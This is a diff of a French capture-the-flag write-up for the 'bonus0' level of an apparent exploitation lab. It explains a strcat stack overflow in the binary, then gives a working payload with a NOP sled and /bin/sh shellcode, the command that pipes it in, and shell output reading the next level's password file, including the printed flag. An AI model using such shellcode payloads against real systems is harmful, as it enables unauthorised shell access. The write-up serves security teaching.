@@ -3,17 +3,22 @@
   / __ \/ __ \/ __ \/ / / / ___/ / / /
  / /_/ / /_/ / / / / /_/ (__  ) /_/ / 
 /_.___/\____/_/ /_/\__,_/____/\____/  
-                                      
-                                      
+                                     
+                                     
+                                     
 
-Afin de mieux comprendre les tenants et aboutissant de l'asm nous allons nous intéresser dans l'ordre : à la fonction <p> puis <pp>
+>$ objdump -d bonus0
+
+On constate dans le <main> la présence d'une fonction <pp> qui à son tour apelle une fonction <p>
+
+Afin de mieux comprendre les tenants et aboutissant de l'asm nous allons nous intéresser dans l'ordre : <p> --> <pp> --> 
 
 
 Que fait <p> ?
 
 - Prend en paramètres la string (1) " - " ainsi qu'une autre string vide (2) "" :   
 - Nous affiche " - " avec puts()
-- Récupére notre input avec un read()
+- Récupére notre input avec un read() dans un large buffer de taille 4096
 - Remplace le "\n" de notre input par "\0"
 - Copie les 20 premiers caratères de notre input dans (2)
 
@@ -30,6 +35,33 @@ Que fait <pp> ?
 
 - Copie notre premier input dans le buffer recu en paramètre lors de son appel dans le <main>
 - Recherche le "\0" dans celle ci pour ensuite le remplacer par " "
-- Concaténe notre premier et second input
+- Concaténe le buffer du <main> (qui contiens maintenant notre 1er input) avec le 2nd input
+
+Noter ici qu'il ya une différence de 20 entre -0x30(%ebp) et -0x1c(%ebp), les deux chaines se suivent dans la stack.
+De plus si nos input sont supérieurs à 20 caractères alors le "\n" est bien remplacé, mais le "\0" n'est pas copié dans (2).
+Puisque nos deux chaines se suivent dans la stack et qu'il n'y a plus de "\0" pour les dissocier, il forme alors une seule et unique chaine. 
+C'est cette chaine qui est concaténée avec le 2nd input. On a donc : [1erinput2ndinput 2ndinput].
+strcat() ne verifiant pas la taille du buffer, cela overwrite l'EIP saved dans notre main.
+
+
+EXPLOIT
+
+- Nous calculons l'offset qui est égale à 9 (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
+- Nous allons overwrite l'EIP saved avec une adresse '\x88\xe6\xff\xbf'  au milieu du large buffer de taille 4096 alloué dans <p> qui
+  contiendra notre shellcode.
+
+BUFFER 4086 <p>
+
+[A*20][B*9][\x88\xe6\xff\xbf][\x90*200][\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80]
+
+ 
+ bonus0@RainFall:~$ (python -c "print('A' * 20 )"; python -c "print('B' * 9 + '\x88\xe6\xff\xbf' + '\x90' * 200 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')"; cat) | ./bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAABBBBBBBBB������������� BBBBBBBBB�������������
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
                         
-                        
+NEXT ...                        
